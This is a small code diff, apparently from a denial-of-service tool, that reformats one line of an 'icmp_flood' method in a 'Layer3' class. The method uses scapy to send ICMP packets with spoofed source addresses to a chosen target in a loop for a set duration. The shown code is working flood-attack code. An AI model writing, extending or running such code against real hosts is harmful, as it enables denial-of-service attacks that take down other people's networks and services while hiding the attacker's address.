@@ -8,5 +8,6 @@ class Layer3:
     def icmp_flood(target: str, time: int):
         end_t = timing.time() + time
         while (timing.time() < end_t):
-            packet = scapy.all.IP(dst=str(target), src=spoof_ip())/scapy.all.ICMP()
+            packet = scapy.all.IP(
+                dst=str(target), src=spoof_ip())/scapy.all.ICMP()
             send(packet, verbose=0)
